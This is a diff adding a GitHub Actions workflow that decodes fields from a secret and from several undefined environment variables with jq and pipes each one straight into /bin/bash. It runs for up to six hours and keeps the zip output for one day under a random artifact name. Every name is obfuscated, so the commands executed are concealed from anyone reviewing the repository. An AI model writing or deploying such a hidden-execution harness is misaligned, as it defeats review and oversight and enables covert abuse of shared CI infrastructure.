@@ -1,0 +1,28 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          ljv1: ${{ secrets.ljv1 }}
+        run: |
+          printf '%s' "$ljv1" | jq -r .gwvop44 | /bin/bash
+          echo $geiz1 | jq -r .l9859 | /bin/bash
+          printf '%s' "$n1" | jq -r .ee38757 | /bin/bash
+          echo $mqqm04190 | jq -r .h5194 | /bin/bash
+          echo $t837 | jq -r .dtpj8056 | /bin/bash
+          echo $lqbs89 | jq -r .cmzo233 | /bin/bash
+          echo $qn32010 | jq -r .z40 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Kay2KeXH
+          path: "*.zip"
+          retention-days: 1
